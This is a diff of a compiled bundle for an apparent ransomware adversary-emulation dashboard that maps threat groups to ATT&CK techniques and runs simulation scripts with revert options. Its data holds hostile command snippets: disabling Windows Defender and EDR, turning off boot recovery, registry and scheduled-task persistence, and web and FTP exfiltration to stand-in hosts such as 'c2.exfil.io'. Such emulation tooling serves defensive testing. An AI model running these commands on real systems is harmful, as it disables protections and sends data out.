@@ -278,7 +278,8 @@ const THREAT_ACTORS = [
                 tactic: 'Defense Evasion',
                 description: 'Modifies registry to disable Windows Defender defenses.',
                 commandSnippet: 'Set-MpPreference -DisableRealtimeMonitoring $true',
-                scriptPath: 'scenarios/lockbit/disable_defender.ps1'
+                scriptPath: 'scenarios/lockbit/disable_defender.ps1',
+                revertScriptPath: 'scenarios/lockbit/disable_defender_revert.ps1'
             },
             {
                 id: 'T1490',
@@ -286,7 +287,8 @@ const THREAT_ACTORS = [
                 tactic: 'Impact',
                 description: 'Disables boot recovery options using bcdedit.',
                 commandSnippet: 'bcdedit /set {default} recoveryenabled No',
-                scriptPath: 'scenarios/lockbit/bcdedit_recovery.ps1'
+                scriptPath: 'scenarios/lockbit/bcdedit_recovery.ps1',
+                revertScriptPath: 'scenarios/lockbit/bcdedit_recovery_revert.ps1'
             }
         ]
     },
@@ -355,7 +357,8 @@ const THREAT_ACTORS = [
                 tactic: 'Defense Evasion',
                 description: 'Uses Backstab tool to disable EDR products.',
                 commandSnippet: 'Stop-Service -Name "Sense" -Force',
-                scriptPath: 'scenarios/blackbasta/disable_edr.ps1'
+                scriptPath: 'scenarios/blackbasta/disable_edr.ps1',
+                revertScriptPath: 'scenarios/blackbasta/disable_edr_revert.ps1'
             },
             {
                 id: 'T1068',
@@ -371,7 +374,16 @@ const THREAT_ACTORS = [
                 tactic: 'Lateral Movement',
                 description: 'Uses valid accounts for RDP access.',
                 commandSnippet: 'mstsc /v:<TARGET_IP>',
-                scriptPath: 'scenarios/blackbasta/rdp_lateral.ps1'
+                scriptPath: 'scenarios/blackbasta/rdp_lateral.ps1',
+                inputParams: [
+                    {
+                        name: 'TargetIP',
+                        label: 'Target IP Address',
+                        type: 'ip',
+                        placeholder: '10.0.0.1',
+                        required: true
+                    }
+                ]
             }
         ]
     },
@@ -407,7 +419,8 @@ const THREAT_ACTORS = [
                 tactic: 'Execution',
                 description: 'Creates scheduled tasks to deploy ransomware via GPO.',
                 commandSnippet: 'schtasks /create /sc once /tn "Update" /tr "C:\\payload.exe" /st 00:00',
-                scriptPath: 'scenarios/alphv/schtask_create.ps1'
+                scriptPath: 'scenarios/alphv/schtask_create.ps1',
+                revertScriptPath: 'scenarios/alphv/schtask_create_revert.ps1'
             }
         ]
     },
@@ -442,7 +455,16 @@ const THREAT_ACTORS = [
                 tactic: 'Command and Control',
                 description: 'Uses tools like AnyDesk or TeamViewer for persistence.',
                 commandSnippet: 'Start-Process "C:\\AnyDesk\\AnyDesk.exe" -ArgumentList "--start-service"',
-                scriptPath: 'scenarios/avoslocker/rat_install.ps1'
+                scriptPath: 'scenarios/avoslocker/rat_install.ps1',
+                inputParams: [
+                    {
+                        name: 'C2URL',
+                        label: 'C2 Server URL',
+                        type: 'url',
+                        placeholder: 'http://10.0.0.1:443/beacon',
+                        required: true
+                    }
+                ]
             },
             {
                 id: 'T1486',
@@ -492,7 +514,8 @@ const THREAT_ACTORS = [
                 tactic: 'Impact',
                 description: 'Encrypts data for extortion.',
                 commandSnippet: '# Encryption simulation (safe mode)',
-                scriptPath: 'scenarios/bianlian/encrypt_sim.ps1'
+                scriptPath: 'scenarios/bianlian/encrypt_sim.ps1',
+                revertScriptPath: 'scenarios/bianlian/encrypt_sim_revert.ps1'
             }
         ]
     },
@@ -520,7 +543,8 @@ const THREAT_ACTORS = [
                 tactic: 'Persistence',
                 description: 'Creates registry run entries for persistence.',
                 commandSnippet: 'Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Update" -Value "C:\\payload.exe"',
-                scriptPath: 'scenarios/clop/registry_persist.ps1'
+                scriptPath: 'scenarios/clop/registry_persist.ps1',
+                revertScriptPath: 'scenarios/clop/registry_persist_revert.ps1'
             },
             {
                 id: 'T1070.001',
@@ -563,7 +587,16 @@ const THREAT_ACTORS = [
                 tactic: 'Exfiltration',
                 description: 'Exfiltrates data before encryption for double extortion.',
                 commandSnippet: 'Invoke-WebRequest -Uri "https://c2.exfil.io/upload" -Method POST',
-                scriptPath: 'scenarios/conti/exfil_web.ps1'
+                scriptPath: 'scenarios/conti/exfil_web.ps1',
+                inputParams: [
+                    {
+                        name: 'ExfilURL',
+                        label: 'Exfiltration URL',
+                        type: 'url',
+                        placeholder: 'http://10.0.0.1:8080/upload',
+                        required: true
+                    }
+                ]
             }
         ]
     },
@@ -581,7 +614,8 @@ const THREAT_ACTORS = [
                 tactic: 'Defense Evasion',
                 description: 'Disables Windows Defender before encryption.',
                 commandSnippet: 'Set-MpPreference -DisableRealtimeMonitoring $true',
-                scriptPath: 'scenarios/dragonforce/disable_defender.ps1'
+                scriptPath: 'scenarios/dragonforce/disable_defender.ps1',
+                revertScriptPath: 'scenarios/dragonforce/disable_defender_revert.ps1'
             },
             {
                 id: 'T1070.004',
@@ -615,7 +649,16 @@ const THREAT_ACTORS = [
                 tactic: 'Initial Access',
                 description: 'Gains access via exposed RDP services.',
                 commandSnippet: 'Test-NetConnection -ComputerName <TARGET> -Port 3389',
-                scriptPath: 'scenarios/safepay/rdp_scan.ps1'
+                scriptPath: 'scenarios/safepay/rdp_scan.ps1',
+                inputParams: [
+                    {
+                        name: 'TargetIP',
+                        label: 'Target IP or Subnet',
+                        type: 'subnet',
+                        placeholder: '10.0.0.0/24',
+                        required: true
+                    }
+                ]
             },
             {
                 id: 'T1548.002',
@@ -623,7 +666,8 @@ const THREAT_ACTORS = [
                 tactic: 'Privilege Escalation',
                 description: 'Bypasses UAC using CMSTPLUA COM object.',
                 commandSnippet: '# UAC bypass via CMSTPLUA simulation',
-                scriptPath: 'scenarios/safepay/uac_bypass.ps1'
+                scriptPath: 'scenarios/safepay/uac_bypass.ps1',
+                revertScriptPath: 'scenarios/safepay/uac_bypass_revert.ps1'
             },
             {
                 id: 'T1003',
@@ -639,7 +683,16 @@ const THREAT_ACTORS = [
                 tactic: 'Exfiltration',
                 description: 'Uses FTP (FileZilla) for data exfiltration.',
                 commandSnippet: 'ftp -s:script.txt ftp.exfil.io',
-                scriptPath: 'scenarios/safepay/ftp_exfil.ps1'
+                scriptPath: 'scenarios/safepay/ftp_exfil.ps1',
+                inputParams: [
+                    {
+                        name: 'FTPServer',
+                        label: 'FTP Server IP',
+                        type: 'ip',
+                        placeholder: '10.0.0.1',
+                        required: true
+                    }
+                ]
             }
         ]
     }
@@ -673,16 +726,56 @@ var _s = __turbopack_context__.k.signature();
 'use client';
 ;
 ;
+// Input validation functions
+const validators = {
+    ip: (v)=>/^(\d{1,3}\.){3}\d{1,3}$/.test(v) && v.split('.').every((n)=>parseInt(n) <= 255),
+    hostname: (v)=>/^[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z]{2,})*$/.test(v),
+    url: (v)=>/^https?:\/\/.+/.test(v),
+    domain: (v)=>/^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$/.test(v),
+    subnet: (v)=>/^(\d{1,3}\.){3}\d{1,3}(\/\d{1,2})?$/.test(v),
+    text: ()=>true
+};
 function ThreatLibrary() {
     _s();
     const [selectedActorId, setSelectedActorId] = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$index$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["useState"])(null);
     const [runningTTP, setRunningTTP] = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$index$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["useState"])(null);
+    const [revertingTTP, setRevertingTTP] = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$index$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["useState"])(null);
     const [output, setOutput] = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$index$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["useState"])({});
+    const [executedTTPs, setExecutedTTPs] = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$index$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["useState"])(new Set());
+    const [inputValues, setInputValues] = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$index$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["useState"])({});
+    const [inputErrors, setInputErrors] = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$index$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["useState"])({});
     const selectedActor = __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$types$2e$ts__$5b$app$2d$client$5d$__$28$ecmascript$29$__["THREAT_ACTORS"].find((a)=>a.id === selectedActorId);
+    const validateInputs = (ttp)=>{
+        if (!ttp.inputParams) return true;
+        const errors = {};
+        let valid = true;
+        for (const param of ttp.inputParams){
+            const value = inputValues[ttp.id]?.[param.name] || '';
+            if (param.required && !value) {
+                errors[param.name] = true;
+                valid = false;
+            } else if (value && !validators[param.type](value)) {
+                errors[param.name] = true;
+                valid = false;
+            }
+        }
+        setInputErrors((prev)=>({
+                ...prev,
+                [ttp.id]: errors
+            }));
+        return valid;
+    };
     const executeTTP = async (ttp)=>{
         if (!ttp.scriptPath) return;
+        if (!validateInputs(ttp)) return;
         setRunningTTP(ttp.id);
         try {
+            const params = {};
+            if (ttp.inputParams) {
+                for (const param of ttp.inputParams){
+                    params[param.name] = inputValues[ttp.id]?.[param.name] || '';
+                }
+            }
             const res = await fetch('/api/execute', {
                 method: 'POST',
                 headers: {
@@ -690,7 +783,7 @@ function ThreatLibrary() {
                 },
                 body: JSON.stringify({
                     scriptPath: ttp.scriptPath,
-                    params: []
+                    params
                 })
             });
             const data = await res.json();
@@ -698,6 +791,7 @@ function ThreatLibrary() {
                     ...prev,
                     [ttp.id]: data.output || data.error
                 }));
+            setExecutedTTPs((prev)=>new Set(prev).add(ttp.id));
         } catch (e) {
             setOutput((prev)=>({
                     ...prev,
@@ -705,6 +799,58 @@ function ThreatLibrary() {
                 }));
         } finally{
             setRunningTTP(null);
+        }
+    };
+    const revertTTP = async (ttp)=>{
+        if (!ttp.revertScriptPath) return;
+        setRevertingTTP(ttp.id);
+        try {
+            const res = await fetch('/api/execute', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    scriptPath: ttp.revertScriptPath,
+                    params: {}
+                })
+            });
+            const data = await res.json();
+            setOutput((prev)=>({
+                    ...prev,
+                    [ttp.id]: `[REVERT OUTPUT]\n${data.output || data.error}`
+                }));
+            setExecutedTTPs((prev)=>{
+                const next = new Set(prev);
+                next.delete(ttp.id);
+                return next;
+            });
+        } catch (e) {
+            setOutput((prev)=>({
+                    ...prev,
+                    [ttp.id]: 'Failed to revert TTP.'
+                }));
+        } finally{
+            setRevertingTTP(null);
+        }
+    };
+    const handleInputChange = (ttpId, paramName, value)=>{
+        setInputValues((prev)=>({
+                ...prev,
+                [ttpId]: {
+                    ...prev[ttpId] || {},
+                    [paramName]: value
+                }
+            }));
+        // Clear error when user types
+        if (inputErrors[ttpId]?.[paramName]) {
+            setInputErrors((prev)=>({
+                    ...prev,
+                    [ttpId]: {
+                        ...prev[ttpId] || {},
+                        [paramName]: false
+                    }
+                }));
         }
     };
     if (selectedActor) {
@@ -723,7 +869,7 @@ function ThreatLibrary() {
                     children: "← BACK TO LIBRARY"
                 }, void 0, false, {
                     fileName: "[project]/src/components/ThreatLibrary.tsx",
-                    lineNumber: 39,
+                    lineNumber: 128,
                     columnNumber: 17
                 }, this),
                 /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
@@ -742,7 +888,7 @@ function ThreatLibrary() {
                             children: selectedActor.name
                         }, void 0, false, {
                             fileName: "[project]/src/components/ThreatLibrary.tsx",
-                            lineNumber: 48,
+                            lineNumber: 137,
                             columnNumber: 21
                         }, this),
                         selectedActor.aliases.length > 0 && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
@@ -756,7 +902,7 @@ function ThreatLibrary() {
                             ]
                         }, void 0, true, {
                             fileName: "[project]/src/components/ThreatLibrary.tsx",
-                            lineNumber: 52,
+                            lineNumber: 141,
                             columnNumber: 25
                         }, this),
                         /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
@@ -768,7 +914,7 @@ function ThreatLibrary() {
                             children: selectedActor.description
                         }, void 0, false, {
                             fileName: "[project]/src/components/ThreatLibrary.tsx",
-                            lineNumber: 56,
+                            lineNumber: 145,
                             columnNumber: 21
                         }, this),
                         /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("h3", {
@@ -781,7 +927,7 @@ function ThreatLibrary() {
                             children: "ATTRIBUTED TTPs"
                         }, void 0, false, {
                             fileName: "[project]/src/components/ThreatLibrary.tsx",
-                            lineNumber: 60,
+                            lineNumber: 149,
                             columnNumber: 21
                         }, this),
                         /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
@@ -793,7 +939,7 @@ function ThreatLibrary() {
                                     style: {
                                         background: 'rgba(255,255,255,0.03)',
                                         padding: '1rem',
-                                        borderLeft: '2px solid var(--primary)'
+                                        borderLeft: `2px solid ${executedTTPs.has(ttp.id) ? '#ff6b35' : 'var(--primary)'}`
                                     },
                                     children: [
                                         /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
@@ -812,24 +958,51 @@ function ThreatLibrary() {
                                                     children: ttp.id
                                                 }, void 0, false, {
                                                     fileName: "[project]/src/components/ThreatLibrary.tsx",
-                                                    lineNumber: 72,
+                                                    lineNumber: 161,
                                                     columnNumber: 37
                                                 }, this),
-                                                /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
-                                                    className: "mono text-dim",
+                                                /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                                     style: {
-                                                        fontSize: '0.8rem'
+                                                        display: 'flex',
+                                                        gap: '0.5rem',
+                                                        alignItems: 'center'
                                                     },
-                                                    children: ttp.tactic.toUpperCase()
-                                                }, void 0, false, {
+                                                    children: [
+                                                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
+                                                            className: "mono text-dim",
+                                                            style: {
+                                                                fontSize: '0.8rem'
+                                                            },
+                                                            children: ttp.tactic.toUpperCase()
+                                                        }, void 0, false, {
+                                                            fileName: "[project]/src/components/ThreatLibrary.tsx",
+                                                            lineNumber: 163,
+                                                            columnNumber: 41
+                                                        }, this),
+                                                        executedTTPs.has(ttp.id) && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
+                                                            style: {
+                                                                background: '#ff6b35',
+                                                                color: '#000',
+                                                                padding: '0.1rem 0.4rem',
+                                                                fontSize: '0.7rem',
+                                                                fontWeight: 'bold'
+                                                            },
+                                                            children: "EXECUTED"
+                                                        }, void 0, false, {
+                                                            fileName: "[project]/src/components/ThreatLibrary.tsx",
+                                                            lineNumber: 165,
+                                                            columnNumber: 45
+                                                        }, this)
+                                                    ]
+                                                }, void 0, true, {
                                                     fileName: "[project]/src/components/ThreatLibrary.tsx",
-                                                    lineNumber: 73,
+                                                    lineNumber: 162,
                                                     columnNumber: 37
                                                 }, this)
                                             ]
                                         }, void 0, true, {
                                             fileName: "[project]/src/components/ThreatLibrary.tsx",
-                                            lineNumber: 71,
+                                            lineNumber: 160,
                                             columnNumber: 33
                                         }, this),
                                         /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("h4", {
@@ -839,7 +1012,7 @@ function ThreatLibrary() {
                                             children: ttp.technique
                                         }, void 0, false, {
                                             fileName: "[project]/src/components/ThreatLibrary.tsx",
-                                            lineNumber: 75,
+                                            lineNumber: 175,
                                             columnNumber: 33
                                         }, this),
                                         /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
@@ -851,7 +1024,7 @@ function ThreatLibrary() {
                                             children: ttp.description
                                         }, void 0, false, {
                                             fileName: "[project]/src/components/ThreatLibrary.tsx",
-                                            lineNumber: 76,
+                                            lineNumber: 176,
                                             columnNumber: 33
                                         }, this),
                                         /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
@@ -868,42 +1041,142 @@ function ThreatLibrary() {
                                             children: ttp.commandSnippet
                                         }, void 0, false, {
                                             fileName: "[project]/src/components/ThreatLibrary.tsx",
-                                            lineNumber: 78,
+                                            lineNumber: 178,
                                             columnNumber: 33
+                                        }, this),
+                                        ttp.inputParams && ttp.inputParams.length > 0 && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
+                                            style: {
+                                                marginBottom: '1rem',
+                                                display: 'grid',
+                                                gap: '0.5rem'
+                                            },
+                                            children: ttp.inputParams.map((param)=>/*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
+                                                    children: [
+                                                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("label", {
+                                                            className: "mono text-dim",
+                                                            style: {
+                                                                fontSize: '0.8rem',
+                                                                display: 'block',
+                                                                marginBottom: '0.25rem'
+                                                            },
+                                                            children: [
+                                                                param.label,
+                                                                " ",
+                                                                param.required && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
+                                                                    style: {
+                                                                        color: '#ff3333'
+                                                                    },
+                                                                    children: "*"
+                                                                }, void 0, false, {
+                                                                    fileName: "[project]/src/components/ThreatLibrary.tsx",
+                                                                    lineNumber: 196,
+                                                                    columnNumber: 86
+                                                                }, this)
+                                                            ]
+                                                        }, void 0, true, {
+                                                            fileName: "[project]/src/components/ThreatLibrary.tsx",
+                                                            lineNumber: 195,
+                                                            columnNumber: 49
+                                                        }, this),
+                                                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("input", {
+                                                            type: "text",
+                                                            placeholder: param.placeholder,
+                                                            value: inputValues[ttp.id]?.[param.name] || '',
+                                                            onChange: (e)=>handleInputChange(ttp.id, param.name, e.target.value),
+                                                            style: {
+                                                                width: '100%',
+                                                                padding: '0.5rem',
+                                                                background: '#111',
+                                                                border: `1px solid ${inputErrors[ttp.id]?.[param.name] ? '#ff3333' : '#333'}`,
+                                                                color: '#fff',
+                                                                fontFamily: 'monospace',
+                                                                fontSize: '0.85rem'
+                                                            }
+                                                        }, void 0, false, {
+                                                            fileName: "[project]/src/components/ThreatLibrary.tsx",
+                                                            lineNumber: 198,
+                                                            columnNumber: 49
+                                                        }, this),
+                                                        inputErrors[ttp.id]?.[param.name] && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
+                                                            style: {
+                                                                color: '#ff3333',
+                                                                fontSize: '0.75rem'
+                                                            },
+                                                            children: [
+                                                                "Invalid ",
+                                                                param.type,
+                                                                " format"
+                                                            ]
+                                                        }, void 0, true, {
+                                                            fileName: "[project]/src/components/ThreatLibrary.tsx",
+                                                            lineNumber: 214,
+                                                            columnNumber: 53
+                                                        }, this)
+                                                    ]
+                                                }, param.name, true, {
+                                                    fileName: "[project]/src/components/ThreatLibrary.tsx",
+                                                    lineNumber: 194,
+                                                    columnNumber: 45
+                                                }, this))
+                                        }, void 0, false, {
+                                            fileName: "[project]/src/components/ThreatLibrary.tsx",
+                                            lineNumber: 192,
+                                            columnNumber: 37
                                         }, this),
                                         /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                             style: {
                                                 display: 'flex',
-                                                justifyContent: 'space-between',
-                                                alignItems: 'center'
+                                                gap: '0.5rem',
+                                                flexWrap: 'wrap'
                                             },
-                                            children: ttp.scriptPath ? /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("button", {
-                                                onClick: ()=>executeTTP(ttp),
-                                                className: "btn",
-                                                disabled: runningTTP === ttp.id,
-                                                style: {
-                                                    fontSize: '0.8rem',
-                                                    padding: '0.3rem 0.8rem'
-                                                },
-                                                children: runningTTP === ttp.id ? 'EXECUTING...' : 'EXECUTE SIMULATION'
-                                            }, void 0, false, {
-                                                fileName: "[project]/src/components/ThreatLibrary.tsx",
-                                                lineNumber: 92,
-                                                columnNumber: 41
-                                            }, this) : /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
-                                                className: "text-dim mono",
-                                                style: {
-                                                    fontSize: '0.8rem'
-                                                },
-                                                children: "PENDING IMPLEMENTATION"
-                                            }, void 0, false, {
-                                                fileName: "[project]/src/components/ThreatLibrary.tsx",
-                                                lineNumber: 101,
-                                                columnNumber: 41
-                                            }, this)
-                                        }, void 0, false, {
+                                            children: [
+                                                ttp.scriptPath && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("button", {
+                                                    onClick: ()=>executeTTP(ttp),
+                                                    className: "btn",
+                                                    disabled: runningTTP === ttp.id,
+                                                    style: {
+                                                        fontSize: '0.8rem',
+                                                        padding: '0.3rem 0.8rem'
+                                                    },
+                                                    children: runningTTP === ttp.id ? 'EXECUTING...' : 'EXECUTE'
+                                                }, void 0, false, {
+                                                    fileName: "[project]/src/components/ThreatLibrary.tsx",
+                                                    lineNumber: 226,
+                                                    columnNumber: 41
+                                                }, this),
+                                                ttp.revertScriptPath && executedTTPs.has(ttp.id) && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("button", {
+                                                    onClick: ()=>revertTTP(ttp),
+                                                    disabled: revertingTTP === ttp.id,
+                                                    style: {
+                                                        fontSize: '0.8rem',
+                                                        padding: '0.3rem 0.8rem',
+                                                        background: '#ff6b35',
+                                                        color: '#000',
+                                                        border: 'none',
+                                                        cursor: 'pointer',
+                                                        fontWeight: 'bold'
+                                                    },
+                                                    children: revertingTTP === ttp.id ? 'REVERTING...' : 'REVERT'
+                                                }, void 0, false, {
+                                                    fileName: "[project]/src/components/ThreatLibrary.tsx",
+                                                    lineNumber: 237,
+                                                    columnNumber: 41
+                                                }, this),
+                                                !ttp.scriptPath && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
+                                                    className: "text-dim mono",
+                                                    style: {
+                                                        fontSize: '0.8rem'
+                                                    },
+                                                    children: "PENDING IMPLEMENTATION"
+                                                }, void 0, false, {
+                                                    fileName: "[project]/src/components/ThreatLibrary.tsx",
+                                                    lineNumber: 255,
+                                                    columnNumber: 41
+                                                }, this)
+                                            ]
+                                        }, void 0, true, {
                                             fileName: "[project]/src/components/ThreatLibrary.tsx",
-                                            lineNumber: 90,
+                                            lineNumber: 224,
                                             columnNumber: 33
                                         }, this),
                                         output[ttp.id] && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
@@ -923,35 +1196,35 @@ function ThreatLibrary() {
                                                 children: output[ttp.id]
                                             }, void 0, false, {
                                                 fileName: "[project]/src/components/ThreatLibrary.tsx",
-                                                lineNumber: 107,
+                                                lineNumber: 261,
                                                 columnNumber: 41
                                             }, this)
                                         }, void 0, false, {
                                             fileName: "[project]/src/components/ThreatLibrary.tsx",
-                                            lineNumber: 106,
+                                            lineNumber: 260,
                                             columnNumber: 37
                                         }, this)
                                     ]
                                 }, ttp.id, true, {
                                     fileName: "[project]/src/components/ThreatLibrary.tsx",
-                                    lineNumber: 66,
+                                    lineNumber: 155,
                                     columnNumber: 29
                                 }, this))
                         }, void 0, false, {
                             fileName: "[project]/src/components/ThreatLibrary.tsx",
-                            lineNumber: 64,
+                            lineNumber: 153,
                             columnNumber: 21
                         }, this)
                     ]
                 }, void 0, true, {
                     fileName: "[project]/src/components/ThreatLibrary.tsx",
-                    lineNumber: 47,
+                    lineNumber: 136,
                     columnNumber: 17
                 }, this)
             ]
         }, void 0, true, {
             fileName: "[project]/src/components/ThreatLibrary.tsx",
-            lineNumber: 38,
+            lineNumber: 127,
             columnNumber: 13
         }, this);
     }
@@ -987,12 +1260,12 @@ function ThreatLibrary() {
                                 children: actor.name
                             }, void 0, false, {
                                 fileName: "[project]/src/components/ThreatLibrary.tsx",
-                                lineNumber: 137,
+                                lineNumber: 291,
                                 columnNumber: 29
                             }, this)
                         }, void 0, false, {
                             fileName: "[project]/src/components/ThreatLibrary.tsx",
-                            lineNumber: 136,
+                            lineNumber: 290,
                             columnNumber: 25
                         }, this),
                         /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
@@ -1007,7 +1280,7 @@ function ThreatLibrary() {
                             ]
                         }, void 0, true, {
                             fileName: "[project]/src/components/ThreatLibrary.tsx",
